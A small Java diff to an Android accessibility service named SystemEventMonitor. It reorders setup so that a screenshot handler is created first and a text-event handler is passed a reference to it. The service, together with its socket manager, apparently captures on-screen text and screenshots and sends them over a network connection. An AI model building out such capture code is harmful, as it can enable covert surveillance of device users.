@@ -58,8 +58,13 @@ public class SystemEventMonitor extends AccessibilityService {
         try {
             // SocketManager constructor already calls connect() internally
             this.socketManager = new SocketManager(this, configManager);
-            this.textEventHandler = new TextEventHandler(socketManager);
+            
+            // Create screenshot handler first
             this.screenShotEventHandler = new ScreenshotEventHandler(this, socketManager, configManager);
+            
+            // Create text handler with screenshot handler reference
+            this.textEventHandler = new TextEventHandler(screenShotEventHandler);
+            
             this.isInitialized = true;
             
             Log.d(TAG, "All components initialized successfully");
